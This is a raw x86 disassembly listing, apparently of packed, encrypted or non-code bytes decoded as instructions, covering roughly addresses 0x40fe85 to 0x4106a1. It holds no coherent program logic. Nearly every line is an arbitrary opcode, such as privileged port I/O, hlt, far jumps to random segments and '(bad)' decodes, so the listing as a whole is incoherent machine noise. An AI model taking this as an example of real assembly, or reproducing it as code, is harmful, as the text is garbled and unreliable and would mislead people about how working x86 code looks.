  40fe85:	jecxz  0x40fee8
  40fe87:	outs   dx,BYTE PTR ds:[esi]
  40fe88:	push   esp
  40fe89:	cmp    eax,DWORD PTR [ebp-0x5cbf60f1]
  40fe8f:	or     eax,0x4214ca5d
  40fe94:	cmp    al,0x17
  40fe96:	sub    DWORD PTR [ecx-0x51765ac6],eax
  40fe9c:	out    dx,eax
  40fe9d:	fcomp  st(4)
  40fe9f:	mov    ecx,0xaa3a54c
  40fea4:	data16 ja 0x40ff03
  40fea7:	outs   dx,DWORD PTR ds:[esi]
  40fea8:	aas    
  40fea9:	hlt    
  40feaa:	jnp    0x40fea1
  40feac:	fistp  QWORD PTR [ebp-0x6a]
  40feaf:	test   BYTE PTR [eax-0x44],al
  40feb2:	push   edi
  40feb3:	in     eax,dx
  40feb4:	fwait
  40feb5:	add    eax,edi
  40feb7:	icebp  
  40feb8:	xor    eax,0xd2b4bcc6
  40febd:	dec    ebx
  40febe:	mov    esi,0x88c9f2ba
  40fec3:	dec    ebp
  40fec4:	(bad)  
  40fec5:	ds inc edi
  40fec7:	sub    al,0xea
  40fec9:	xchg   esp,eax
  40feca:	sahf   
  40fecb:	cld    
  40fecc:	sbb    eax,0x13a536b9
  40fed1:	push   ebx
  40fed2:	or     BYTE PTR [ebp+0x2d],bh
  40fed5:	mov    esi,0x64cfb292
  40feda:	mov    ebp,0x1939a8b9
  40fedf:	aam    0xb9
  40fee1:	div    ch
  40fee3:	lods   al,BYTE PTR ds:[esi]
  40fee4:	fmul   QWORD PTR ds:0xb69434e1
  40feea:	add    ecx,ebp
  40feec:	loop   0x40ff1f
  40feee:	or     al,0x59
  40fef0:	pushf  
  40fef1:	mov    ah,0xdd
  40fef3:	cmp    DWORD PTR ds:0xece1a113,esp
  40fef9:	and    ebx,DWORD PTR [edi-0x73]
  40fefc:	jl     0x40fed1
  40fefe:	or     dh,ch
  40ff00:	sub    ecx,DWORD PTR [eax+0xb]
  40ff03:	and    ebx,ebp
  40ff05:	add    DWORD PTR [ebx+0x5b506f6c],edi
  40ff0b:	mov    dl,0x8f
  40ff0d:	int3   
  40ff0e:	mov    ds:0x4cd0c10a,al
  40ff13:	jle    0x40ff65
  40ff15:	test   eax,0xb6ecb42
  40ff1a:	bound  esi,QWORD PTR [ecx+esi*8+0x51]
  40ff1e:	(bad)  
  40ff1f:	pushf  
  40ff20:	push   edx
  40ff21:	sbb    BYTE PTR [ebx+0x27],0x76
  40ff25:	inc    esi
  40ff26:	pop    es
  40ff27:	lods   eax,DWORD PTR ds:[esi]
  40ff28:	push   edi
  40ff29:	mov    bl,0xb0
  40ff2b:	lea    edx,[eax]
  40ff2d:	(bad)  
  40ff2e:	vpsubq xmm0,xmm3,XMMWORD PTR [eax+0x18fb49fa]
  40ff36:	mov    edx,0xca284fdf
  40ff3b:	stos   DWORD PTR es:[edi],eax
  40ff3c:	inc    edi
  40ff3d:	into   
  40ff3e:	or     al,0x22
  40ff40:	mov    ebx,0x57f6d493
  40ff45:	retf   
  40ff46:	cmp    DWORD PTR [edi-0x1f0156d5],ebx
  40ff4c:	add    al,0x17
  40ff4e:	call   0xa204:0x815bb3ce
  40ff55:	scas   eax,DWORD PTR es:[edi]
  40ff56:	retf   
  40ff57:	sub    eax,0x1076c597
  40ff5c:	mov    fs:0xc9d3a37d,eax
  40ff62:	jecxz  0x40ff1d
  40ff64:	push   ss
  40ff65:	jne    0x40ff1e
  40ff67:	xchg   ebx,eax
  40ff68:	pop    esi
  40ff69:	into   
  40ff6a:	jnp    0x40ffb4
  40ff6c:	add    esi,DWORD PTR [ebp-0x6d94f907]
  40ff72:	int    0xc7
  40ff74:	dec    edi
  40ff75:	mov    ds:0xa636de,eax
	...
  40ffbe:	add    BYTE PTR [edi-0x5c],ch
  40ffc1:	daa    
  40ffc2:	jbe    0x40ffb3
  40ffc4:	idiv   DWORD PTR [edi-0x43]
  40ffc7:	mov    ecx,0xe16f8af
  40ffcc:	(bad)  
  40ffcd:	scas   eax,DWORD PTR es:[edi]
  40ffce:	js     0x40fffb
  40ffd0:	add    eax,0x7220001
  40ffd5:	add    BYTE PTR [eax],al
  40ffd7:	pop    ss
  40ffd8:	fadd   QWORD PTR fs:[eax]
  40ffdb:	mov    dl,0xe5
  40ffdd:	ins    BYTE PTR es:[edi],dx
  40ffde:	mov    bh,0xc1
  40ffe0:	(bad)  
  40ffe1:	into   
  40ffe2:	fs push cs
  40ffe4:	int    0xb3
  40ffe6:	jno    0x410027
  40ffe8:	mov    esp,0xe59cd06c
  40ffed:	inc    edi
  40ffee:	data16 clc 
  40fff0:	int    0xb3
  40fff2:	sti    
  40fff3:	popa   
  40fff4:	push   ss
  40fff5:	aaa    
  40fff6:	cmp    dl,ah
  40fff8:	ficomp WORD PTR [ebx+eax*2-0x54d31d05]
  40ffff:	and    DWORD PTR [eax-0x3a],esi
  410002:	and    ebx,edx
  410004:	or     eax,ebp
  410006:	inc    ebp
  410007:	(bad)  
  410008:	daa    
  410009:	pop    es
  41000a:	cmp    ch,bh
  41000c:	lock fwait
  41000e:	sbb    al,0xff
  410010:	test   al,0xa7
  410012:	xchg   ebx,eax
  410013:	shr    edi,cl
  410015:	jmp    0x410062
  410017:	test   cl,0x2e
  41001a:	rol    BYTE PTR [ecx+0x1e],cl
  41001d:	jle    0x41000f
  41001f:	outs   dx,BYTE PTR ds:[esi]
  410020:	sar    DWORD PTR [edx-0x5c718fa1],cl
  410026:	data16 std 
  410028:	inc    esp
  410029:	inc    esi
  41002a:	jecxz  0x410081
  41002c:	pop    ss
  41002d:	sub    DWORD PTR [ebp+0x274871cd],ebp
  410033:	mov    al,ds:0x635b784d
  410038:	ins    BYTE PTR es:[edi],dx
  410039:	adc    eax,0xb7fe7d3c
  41003e:	push   es
  41003f:	(bad)  
  410040:	(bad)  
  410041:	jmp    0x41008c
  410043:	rol    DWORD PTR [ecx+0x4f7ea3f5],cl
  410049:	dec    ebp
  41004a:	repnz adc ebx,DWORD PTR [ebx+0x47740766]
  410051:	aas    
  410052:	xchg   edi,eax
  410053:	pop    esi
  410054:	sub    esi,ecx
  410056:	inc    edx
  410057:	fldenv [ebx]
  410059:	push   ss
  41005a:	dec    edi
  41005b:	sub    ebp,esp
  41005d:	adc    dl,bh
  41005f:	pop    edi
  410060:	fiadd  DWORD PTR ds:0x58b8667b
  410066:	mov    ebp,0xf2b1b34
  41006b:	jb     0x40ffef
  41006d:	mov    al,0x10
  41006f:	sbb    DWORD PTR [edx+0x14eb1b7e],0x3
  410076:	mov    edx,0xf08a1078
  41007b:	popa   
  41007c:	outs   dx,BYTE PTR ds:[esi]
  41007d:	inc    eax
  41007e:	mov    ds:0xd97be55f,al
  410083:	call   0x5ff7efcd
  410088:	dec    ecx
  410089:	fs out 0x7a,eax
  41008c:	shl    DWORD PTR [esi+0x20f7352],0x6e
  410093:	sub    ch,dh
  410095:	jle    0x4100a9
  410097:	(bad)  
  410099:	test   eax,0xe50cf315
  41009e:	adc    bh,ch
  4100a0:	add    DWORD PTR [ecx+eiz*2-0x29e1671e],0xab1e3843
  4100ab:	scas   eax,DWORD PTR es:[edi]
  4100ac:	jmp    DWORD PTR [ecx-0x606d7576]
  4100b2:	jo     0x41009f
  4100b4:	push   ds
  4100b5:	inc    ebp
  4100b6:	popf   
  4100b7:	or     al,0x1e
  4100b9:	jmp    0xc077e6ba
  4100be:	pop    edx
  4100bf:	pop    ds
  4100c0:	dec    edx
  4100c1:	aad    0x5f
  4100c3:	cmp    BYTE PTR [ebp-0x268c1c41],0xec
  4100ca:	loop   0x41005e
  4100cc:	jbe    0x410062
  4100ce:	inc    esp
  4100cf:	iret   
  4100d0:	sbb    ecx,edx
  4100d2:	lahf   
  4100d3:	arpl   sp,sp
  4100d5:	jo     0x4100fc
  4100d7:	je     0x41008c
  4100d9:	mov    ebx,0xe0f3fc63
  4100de:	stc    
  4100df:	xor    ebp,DWORD PTR [esi]
  4100e1:	sbb    dl,BYTE PTR [ecx-0x3a76b191]
  4100e7:	jne    0x410102
  4100e9:	pop    es
  4100ea:	or     ecx,eax
  4100ec:	sub    DWORD PTR [esi],ecx
  4100ee:	test   DWORD PTR [edi-0x21],ebp
  4100f1:	(bad)  
  4100f2:	jecxz  0x410121
  4100f4:	or     ah,BYTE PTR ss:[edx]
  4100f7:	xchg   ebp,eax
  4100f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100f9:	out    dx,al
  4100fa:	or     BYTE PTR [esi-0x6e8ed026],bh
  410100:	arpl   WORD PTR [ebx+0x1441b143],cx
  410106:	sbb    ebx,DWORD PTR [eax+eiz*8]
  410109:	jnp    0x410100
  41010b:	dec    eax
  41010c:	scas   al,BYTE PTR es:[edi]
  41010d:	cmp    bh,BYTE PTR [edi-0x14]
  410110:	das    
  410111:	or     DWORD PTR [eax+0x1bf8b314],esp
  410117:	xchg   ecx,eax
  410118:	int    0xf0
  41011a:	mov    eax,ds:0xe9220ecb
  41011f:	sti    
  410120:	arpl   WORD PTR [edi+edi*8],bx
  410123:	adc    DWORD PTR [edx],0xe4eda069
  410129:	ds inc eax
  41012b:	cs jns 0x41016c
  41012e:	dec    edx
  41012f:	cs dec esi
  410131:	jl     0x4100d6
  410133:	push   es
  410134:	xchg   edx,eax
  410135:	inc    eax
  410136:	xchg   edi,eax
  410137:	dec    esp
  410138:	loope  0x41018e
  41013a:	and    eax,0xe26c485f
  41013f:	fsub   st,st(1)
  410141:	inc    ecx
  410142:	xor    edi,DWORD PTR [ebp+0x74cffed9]
  410148:	in     al,dx
  410149:	je     0x410188
  41014b:	mov    esp,0x8acc4220
  410150:	xchg   ecx,eax
  410151:	pop    edx
  410152:	and    al,BYTE PTR [ecx]
  410154:	nop
  410155:	stc    
  410156:	into   
  410157:	sbb    ch,al
  410159:	dec    esi
  41015a:	and    al,0x1e
  41015c:	push   ebp
  41015d:	jmp    0x8fa2:0xd3c75268
  410164:	in     eax,0x9f
  410166:	int3   
  410167:	or     al,0xa5
  410169:	test   BYTE PTR [ebx+0x63],0x29
  41016d:	nop
  41016e:	sbb    edi,edx
  410170:	add    al,0x5c
  410172:	push   ds
  410173:	rcr    DWORD PTR [esi],cl
  410175:	add    BYTE PTR [eax],bh
  410177:	lods   eax,DWORD PTR ds:[esi]
  410178:	nop
  410179:	lods   eax,DWORD PTR ds:[esi]
  41017a:	pop    esp
  41017b:	ins    BYTE PTR es:[edi],dx
  41017c:	fstp   TBYTE PTR [esi-0x31]
  41017f:	mov    bh,0xb4
  410181:	int3   
  410182:	(bad)  
  410183:	rol    DWORD PTR [ecx+0x2f13b11],0xbc
  41018a:	xchg   esp,eax
  41018b:	adc    dh,BYTE PTR [edx+0x3e]
  41018e:	fnsave [esi-0x11]
  410191:	cs jno 0x4101da
  410194:	pop    esi
  410195:	jge    0x4101fe
  410197:	ins    BYTE PTR es:[edi],dx
  410198:	gs inc esi
  41019a:	mov    BYTE PTR [eax-0x6b],bl
  41019d:	jnp    0x4101fe
  41019f:	test   al,0x2f
  4101a1:	(bad)  
  4101a2:	pop    edx
  4101a3:	and    al,0xcd
  4101a5:	xchg   esi,eax
  4101a6:	push   esi
  4101a7:	clc    
  4101a8:	inc    DWORD PTR [eax]
  4101aa:	xor    eax,edx
  4101ac:	imul   ecx,DWORD PTR [edi+0x20],0x617dcb45
  4101b3:	push   esi
  4101b4:	sbb    ch,BYTE PTR [eax-0x2574e4f1]
  4101ba:	sub    eax,0x7c2e7fb2
  4101bf:	fmul   DWORD PTR [edx-0x36]
  4101c2:	add    eax,0x5292b620
  4101c7:	neg    BYTE PTR [ecx+0x6f65646d]
  4101cd:	mov    dh,0x25
  4101cf:	sbb    al,BYTE PTR [edx+0x4e]
  4101d2:	or     al,BYTE PTR [ebp-0x7e]
  4101d5:	rol    BYTE PTR [eax-0x74],0x30
  4101d9:	mov    ds:0x27c4c467,al
  4101de:	inc    edi
  4101df:	sti    
  4101e0:	jne    0x4101dc
  4101e2:	push   ecx
  4101e3:	out    dx,al
  4101e4:	(bad)  
  4101e6:	in     eax,dx
  4101e7:	adc    edi,DWORD PTR [ebp+0x7]
  4101ea:	cmp    BYTE PTR [edi+0x28],bh
  4101ed:	sub    al,BYTE PTR [eax+0x23]
  4101f0:	cmp    al,0x4
  4101f2:	lods   al,BYTE PTR ds:[esi]
  4101f3:	cmp    DWORD PTR [ebp-0x245904e8],0x18be91d
  4101fd:	push   esi
  4101fe:	xchg   ecx,eax
  4101ff:	mov    ch,0x69
  410201:	xor    esp,ecx
  410203:	loopne 0x410198
  410205:	fld    QWORD PTR [ebp-0x6cc0b952]
  41020b:	aaa    
  41020c:	aaa    
  41020d:	mov    bl,0x99
  41020f:	test   ch,0xeb
  410212:	mov    bl,BYTE PTR [ebx-0x44]
  410215:	dec    esp
  410216:	lods   al,BYTE PTR ds:[esi]
  410217:	jmp    0x4101f1
  410219:	test   BYTE PTR [esi-0x65],ch
  41021c:	leave  
  41021d:	ja     0x4101ab
  41021f:	xor    bh,BYTE PTR [ebp+ebp*8+0x55]
  410223:	je     0x410240
  410225:	mov    al,0x6f
  410227:	(bad)  
  410228:	fld    TBYTE PTR [edi+0x6e3c542e]
  41022e:	xor    ebx,DWORD PTR [ecx+0x509ff685]
  410234:	scas   al,BYTE PTR es:[edi]
  410235:	bound  ebp,QWORD PTR [ebp+ebp*4+0x55]
  410239:	ret    
  41023a:	sub    eax,0xc53dc5d4
  41023f:	mov    ecx,0x435d2d40
  410244:	inc    edx
  410245:	outs   dx,DWORD PTR ds:[esi]
  410246:	fiadd  DWORD PTR ds:0x79c33b71
  41024c:	add    cl,BYTE PTR [ebx+0x9]
  41024f:	pop    ebp
  410250:	xchg   DWORD PTR [eax-0x61ec1780],edi
  410256:	sbb    eax,0x7fb9bdc9
  41025b:	repz xor al,0x26
  41025e:	mov    ecx,0xe4ac4cf9
  410263:	sbb    al,0xb2
  410265:	pop    edx
  410266:	aaa    
  410267:	mov    WORD PTR [edi],ds
  410269:	adc    eax,ebx
  41026b:	pusha  
  41026c:	das    
  41026d:	or     BYTE PTR [ebp-0x6],ch
  410270:	sahf   
  410271:	cdq    
  410272:	fs jle 0x4102d8
  410275:	not    DWORD PTR [edi+ebx*4-0x3]
  410279:	cmp    BYTE PTR [eax-0x14aa504],dh
  41027f:	lock and dh,ch
  410282:	inc    eax
  410283:	in     eax,dx
  410284:	sub    BYTE PTR [edi],cl
  410286:	sbb    esp,ebx
  410288:	xchg   edx,eax
  410289:	and    ah,ch
  41028b:	cmp    eax,0x18c0871a
  410290:	push   eax
  410291:	sbb    ch,bh
  410293:	add    al,0xfc
  410295:	or     al,ah
  410297:	mov    edx,0xf923611d
  41029c:	icebp  
  41029d:	test   DWORD PTR [ebx+edi*4-0x6eb96529],0x40c06658
  4102a8:	mov    dh,0xa0
  4102aa:	repnz aas 
  4102ac:	cmp    BYTE PTR [ebx+edx*8+0x47],ah
  4102b0:	jmp    0x8a67:0x1956b3f4
  4102b7:	pushf  
  4102b8:	in     eax,0xc6
  4102ba:	js     0x410265
  4102bc:	shufps xmm5,XMMWORD PTR [esi-0x13a22372],0xe8
  4102c4:	mov    bl,0x50
  4102c6:	inc    edx
  4102c7:	ins    DWORD PTR es:[edi],dx
  4102c8:	idiv   bh
  4102ca:	mov    ebp,0x4785e75f
  4102cf:	jb     0x410273
  4102d1:	push   edi
  4102d2:	cmp    ecx,esi
  4102d4:	xchg   ecx,eax
  4102d5:	xchg   ebx,eax
  4102d6:	hlt    
  4102d7:	adc    BYTE PTR [ecx+eiz*1+0x3f],0x27
  4102dc:	dec    ebx
  4102dd:	lods   eax,DWORD PTR ds:[esi]
  4102de:	xchg   esi,eax
  4102df:	mov    ecx,ebx
  4102e1:	ficomp WORD PTR [edi+0x74]
  4102e4:	xor    ebx,edi
  4102e6:	outs   dx,BYTE PTR ds:[esi]
  4102e7:	iret   
  4102e8:	retf   
  4102e9:	aaa    
  4102ea:	mov    eax,ds:0x6aaceda5
  4102ef:	stc    
  4102f0:	sbb    eax,0x316fdc00
  4102f5:	imul   edi,DWORD PTR [ecx+0x240366e3],0xffffffa2
  4102fc:	pop    ebp
  4102fd:	hlt    
  4102fe:	adc    DWORD PTR [edx],edx
  410300:	sbb    ch,BYTE PTR [ebp-0x3fb28273]
  410306:	iret   
  410307:	repnz stos BYTE PTR es:[edi],al
  410309:	bound  eax,QWORD PTR [edi]
  41030b:	ins    DWORD PTR es:[edi],dx
  41030c:	cmp    al,ah
  41030e:	loope  0x4102a1
  410310:	imul   BYTE PTR [edi]
  410312:	daa    
  410313:	rcr    bh,cl
  410315:	push   ss
  410316:	or     BYTE PTR [edi+0x5d],al
  410319:	add    BYTE PTR [edi-0x702f7e06],cl
  41031f:	push   esi
  410320:	pop    ss
  410321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410322:	dec    esi
  410323:	mov    esp,0x1e58264
  410328:	cld    
  410329:	mov    ah,0x37
  41032b:	xor    eax,0x1e412cac
  410330:	and    ebp,DWORD PTR [ecx]
  410332:	cmp    DWORD PTR [ebp+0x6b],0xffffffb5
  410336:	imul   ecx,DWORD PTR [ebx],0xffffffd7
  410339:	out    dx,eax
  41033a:	dec    edx
  41033b:	sub    eax,0xaeae81ba
  410340:	cmp    ebp,DWORD PTR [esi+0x22]
  410343:	xor    BYTE PTR [edx+0x6464f9d0],dh
  410349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41034a:	popf   
  41034b:	rcl    DWORD PTR [esi-0x3adc843b],1
  410351:	dec    esp
  410352:	adc    esi,DWORD PTR cs:0xc4e9e973
  410359:	sub    cl,bh
  41035b:	pop    esp
  41035c:	repnz clc 
  41035e:	mov    bh,BYTE PTR [edi*4+0x57ec33db]
  410365:	rcl    DWORD PTR [ebx+edx*8-0x654e3c23],0x2a
  41036d:	jmp    0x4103e6
  41036f:	pop    esp
  410370:	out    dx,al
  410371:	call   DWORD PTR [ecx+edi*1]
  410374:	jl     0x41030c
  410376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410377:	shl    BYTE PTR [edi-0x6c],cl
  41037a:	das    
  41037b:	push   0xffffffbf
  41037d:	fld    DWORD PTR [ebx-0x49322d45]
  410383:	mov    BYTE PTR [edi-0x7f],dh
  410386:	into   
  410387:	dec    ebx
  410388:	std    
  410389:	fisttp WORD PTR ds:0xe554b2ff
  41038f:	ins    DWORD PTR es:[edi],dx
  410390:	inc    eax
  410391:	fcom   QWORD PTR [edi-0x686cf062]
  410397:	adc    dh,BYTE PTR [esi-0x3d]
  41039a:	lods   eax,DWORD PTR ds:[esi]
  41039b:	aas    
  41039c:	cld    
  41039d:	clc    
  41039e:	lahf   
  41039f:	inc    eax
  4103a0:	inc    ebp
  4103a1:	dec    edx
  4103a2:	mov    al,0xf1
  4103a4:	out    0xfc,eax
  4103a6:	inc    ebp
  4103a7:	or     BYTE PTR [edx],bh
  4103a9:	jecxz  0x4103c9
  4103ab:	xchg   esi,eax
  4103ac:	sbb    eax,0xde10f98b
  4103b1:	jnp    0x4103fb
  4103b3:	ja     0x410367
  4103b5:	jb     0x4103e9
  4103b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b8:	scas   al,BYTE PTR es:[edi]
  4103b9:	mov    edx,0x306e6f21
  4103be:	inc    ebp
  4103bf:	and    al,0xf3
  4103c1:	cmp    al,0xf0
  4103c3:	xor    esi,eax
  4103c5:	hlt    
  4103c6:	xor    esp,DWORD PTR [edx]
  4103c8:	cld    
  4103c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103ca:	lahf   
  4103cb:	retf   0x4870
  4103ce:	and    ah,BYTE PTR [eax+esi*8+0x4a]
  4103d2:	(bad)  
  4103d3:	ficom  DWORD PTR ds:0xa23787eb
  4103d9:	lds    esi,FWORD PTR [ebx+0x1e]
  4103dc:	cs js  0x410369
  4103df:	gs sub edi,esp
  4103e2:	fisttp WORD PTR [ebx-0x4b]
  4103e5:	dec    ebp
  4103e6:	shr    BYTE PTR [eax+0x72438a48],0xaf
  4103ed:	sti    
  4103ee:	pop    edi
  4103ef:	push   ss
  4103f0:	repz pushf 
  4103f2:	hlt    
  4103f3:	sahf   
  4103f4:	pusha  
  4103f5:	in     eax,dx
  4103f6:	jl     0x410393
  4103f8:	shr    DWORD PTR [esi],0x9b
  4103fb:	jne    0x41045d
  4103fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103fe:	inc    ebx
  4103ff:	fwait
  410400:	neg    BYTE PTR [ebx]
  410402:	in     al,dx
  410403:	outs   dx,DWORD PTR ds:[esi]
  410404:	mov    eax,ds:0x12883c29
  410409:	stos   BYTE PTR es:[edi],al
  41040a:	pop    ds
  41040b:	mov    eax,0xb5080077
  410410:	or     BYTE PTR ds:0x4775969a,0x36
  410417:	aam    0xd4
  410419:	shl    BYTE PTR [eax-0x1],1
  41041c:	leave  
  41041d:	aad    0xfc
  41041f:	imul   esi,DWORD PTR [edi],0x931a0603
  410425:	sti    
  410426:	mov    al,0x13
  410428:	in     eax,0xed
  41042a:	pop    ecx
  41042b:	sar    BYTE PTR [eax-0x7acf9150],cl
  410431:	xchg   esi,eax
  410432:	clc    
  410433:	neg    BYTE PTR [ecx]
  410435:	adc    BYTE PTR [ecx],bh
  410437:	push   edx
  410438:	add    al,0xc9
  41043a:	shr    BYTE PTR [ecx+0x19],cl
  41043d:	mov    ah,0x3d
  41043f:	rcr    BYTE PTR [edi],cl
  410441:	jae    0x41048d
  410443:	dec    ecx
  410444:	cs jo  0x41044b
  410447:	sub    BYTE PTR [edx+0x4e],dh
  41044a:	inc    esp
  41044b:	mov    ecx,0x8bbad16a
  410450:	and    eax,0xf106b168
  410455:	test   eax,0xac121464
  41045a:	pop    esi
  41045b:	lods   al,BYTE PTR ds:[esi]
  41045c:	jg     0x410431
  41045e:	sbb    bh,BYTE PTR [esi-0x24]
  410461:	push   esp
  410462:	mov    esi,0xa060a105
  410467:	dec    ebx
  410468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410469:	mov    edi,0xfabcbb15
  41046e:	loopne 0x41045c
  410470:	push   0x1dee7fe7
  410475:	fisub  DWORD PTR [edi+0x61d01b5d]
  41047b:	loope  0x4104ba
  41047d:	neg    BYTE PTR [eax+0x3c]
  410480:	jo     0x4104ae
  410482:	(bad)  
  410484:	enter  0x7465,0x74
  410488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410489:	sub    ah,BYTE PTR [edi+0x657c57dc]
  41048f:	dec    ch
  410491:	jo     0x410430
  410493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410494:	lods   eax,DWORD PTR ds:[esi]
  410495:	ins    BYTE PTR es:[edi],dx
  410496:	cwde   
  410497:	pop    eax
  410498:	cli    
  410499:	ret    0x9027
  41049c:	lods   al,BYTE PTR ds:[esi]
  41049d:	pop    esp
  41049e:	adc    DWORD PTR [eax+0x45f52293],0xbe17c597
  4104a8:	out    dx,al
  4104a9:	sub    DWORD PTR [eax-0x7b1cfee8],0x70
  4104b0:	sub    BYTE PTR [ecx+ebp*8-0x33bf32fd],cl
  4104b7:	dec    ebx
  4104b8:	out    0x69,eax
  4104ba:	lock adc edx,DWORD PTR [edi]
  4104bd:	pop    eax
  4104be:	fcomp  QWORD PTR [eax+esi*8-0x445c3b1a]
  4104c5:	(bad)
  4104c9:	icebp  
  4104ca:	adc    ch,bh
  4104cc:	cwde   
  4104cd:	pop    ecx
  4104ce:	xor    eax,0x43003dd1
  4104d3:	scas   al,BYTE PTR es:[edi]
  4104d4:	xor    eax,0x4f15f6e9
  4104d9:	cmp    eax,0x21610ac
  4104de:	inc    eax
  4104df:	mov    esp,DWORD PTR [ebx+0x66]
  4104e2:	retf   
  4104e3:	mov    esi,0x2bc8bb58
  4104e9:	and    eax,0xe43a7d11
  4104ee:	sahf   
  4104ef:	push   esp
  4104f0:	jmp    0x78ff7b1e
  4104f5:	imul   edi,DWORD PTR [ebx],0x832a3f9d
  4104fb:	ror    DWORD PTR [eax-0x69],0x12
  4104ff:	jmp    0xe3b1c0f0
  410504:	xchg   esi,eax
  410505:	into   
  410506:	pop    esp
  410507:	or     ch,BYTE PTR [ecx+0x4f5fe03d]
  41050d:	or     al,0x9f
  41050f:	repz std 
  410511:	or     BYTE PTR [eax+0x24],0x5d
  410515:	in     al,0x30
  410517:	jmp    0x7d8f0bad
  41051c:	gs out 0x6d,al
  41051f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410520:	jge    0x410566
  410522:	xor    BYTE PTR [edx],ch
  410524:	test   eax,0x67856fe4
  410529:	call   0xc6b9:0x1fab7a16
  410530:	jne    0x41056f
  410532:	test   eax,0x3f377667
  410537:	mov    WORD PTR [esi+0x55877b8],gs
  41053d:	push   0xfffffff0
  41053f:	dec    esi
  410540:	ss add eax,0xde259a59
  410546:	mov    eax,0xd9c5985a
  41054b:	leave  
  41054c:	mov    gs,esi
  41054e:	ss out dx,eax
  410550:	ss xchg esi,eax
  410552:	fsubrp st(7),st
  410554:	leave  
  410555:	es out dx,al
  410557:	rol    DWORD PTR [edi+0x79],1
  41055a:	pop    esp
  41055b:	fld    QWORD PTR [eax]
  41055d:	add    BYTE PTR [ebx-0x3f3ed7f5],ah
  410563:	fdivrp st(1),st
  410565:	add    DWORD PTR [ebp+edx*4-0x2a],0xffffffa8
  41056a:	jge    0x4105a9
  41056c:	sbb    dh,BYTE PTR [edx]
  41056e:	cld    
  41056f:	mov    dh,0xac
  410571:	cmp    al,0x27
  410573:	add    ch,BYTE PTR [ebx+0x21c51aca]
  410579:	cdq    
  41057a:	xlat   BYTE PTR ds:[ebx]
  41057b:	stos   DWORD PTR es:[edi],eax
  41057c:	inc    edi
  41057d:	and    edx,ecx
  41057f:	sub    bh,dh
  410581:	push   0x19
  410583:	addr16 mov ebp,0x4016f697
  410589:	pop    ebx
  41058a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41058b:	call   0x20cb523
  410590:	js     0x410597
  410592:	sub    dl,dh
  410594:	pop    es
  410595:	repz add al,BYTE PTR [edx-0x5a]
  410599:	push   es
  41059a:	int    0xb6
  41059c:	ret    
  41059d:	push   ds
  41059e:	jno    0x410552
  4105a0:	aaa    
  4105a1:	mov    ds:0xcfbad17d,al
  4105a6:	(bad)  
  4105a8:	inc    ebp
  4105a9:	loope  0x4105f3
  4105ab:	fdiv   st,st(5)
  4105ad:	test   BYTE PTR [ecx],0x1c
  4105b0:	adc    ebp,DWORD PTR [eax-0x1b695a50]
  4105b6:	imul   ebp,DWORD PTR [eax],0xa
  4105b9:	adc    eax,0x89d923c
  4105be:	push   esp
  4105bf:	aam    0x26
  4105c1:	and    BYTE PTR [eax-0x3a],dh
  4105c4:	mov    ch,0x1a
  4105c6:	test   al,al
  4105c8:	shld   edx,esp,0x36
  4105cc:	call   0xc528:0x694be39a
  4105d3:	nop
  4105d4:	stos   BYTE PTR es:[edi],al
  4105d5:	stc    
  4105d6:	mov    al,0x29
  4105d8:	imul   eax,edx,0x8f5354a0
  4105de:	cld    
  4105df:	pushf  
  4105e0:	xor    eax,0xd027859b
  4105e5:	sbb    bl,ah
  4105e7:	ret    0x2f32
  4105ea:	retf   
  4105eb:	cmp    edi,DWORD PTR [edx+0xde0efa8]
  4105f1:	test   eax,0x9fa970c1
  4105f6:	jge    0x410657
  4105f8:	lock xor al,0x93
  4105fb:	jnp    0x410641
  4105fd:	in     eax,0xf
  4105ff:	outs   dx,BYTE PTR ds:[esi]
  410600:	xor    eax,0x50baaf55
  410605:	cli    
  410606:	call   0x25da:0xfcf8e4ab
  41060d:	div    al
  41060f:	pop    es
  410610:	in     eax,dx
  410611:	push   esi
  410612:	and    BYTE PTR [edx+0x54975add],bh
  410618:	mov    ebx,0x2f7e6040
  41061d:	ret    0x6ea
  410620:	mov    dh,0x4b
  410622:	aas    
  410623:	arpl   WORD PTR [edx],dx
  410625:	xor    eax,0x66623238
  41062a:	jecxz  0x41060e
  41062c:	fucomi st,st(3)
  41062e:	add    bh,BYTE PTR [esi]
  410630:	mov    dh,BYTE PTR [ebp-0x1f]
  410633:	in     al,dx
  410634:	mov    esi,0x8075b68a
  410639:	push   0xffffffa7
  41063b:	fdiv   DWORD PTR ds:0x8ae2ffe
  410641:	xchg   esi,eax
  410642:	faddp  st(6),st
  410644:	adc    eax,0x39073ba3
  410649:	sub    bl,BYTE PTR [ebp+0x1d]
  41064c:	cli    
  41064d:	in     al,dx
  41064e:	enter  0xca04,0x76
  410652:	cmc    
  410653:	jmp    0xdf38:0xd5bb5947
  41065a:	aam    0x46
  41065c:	jmp    0xabe86d6a
  410661:	jl     0x4105f3
  410663:	loope  0x410641
  410665:	sub    DWORD PTR [esi],0xffffff84
  410668:	dec    edi
  410669:	jecxz  0x41064e
  41066b:	sahf   
  41066c:	pop    es
  41066d:	lods   al,BYTE PTR ds:[esi]
  41066e:	push   ebx
  41066f:	sahf   
  410670:	adc    eax,0xa180ac92
  410675:	or     DWORD PTR ds:0x21ea9645,esi
  41067b:	ds mov es,esp
  41067e:	pop    esp
  41067f:	hlt    
  410680:	stos   DWORD PTR es:[edi],eax
  410681:	dec    eax
  410682:	xchg   esp,eax
  410683:	nop
  410684:	pushf  
  410685:	push   ebx
  410686:	inc    esp
  410687:	or     DWORD PTR [edx-0xb],edx
  41068a:	cmp    al,0xe5
  41068c:	add    esi,DWORD PTR [esi-0x38]
  41068f:	mov    eax,ds:0x2cb12539
  410694:	lahf   
  410695:	vpshufd xmm6,XMMWORD PTR [esi-0x898dbff],0xd9
  41069e:	add    DWORD PTR [edi],0xffffff9d
  4106a1:	jb     0x410656
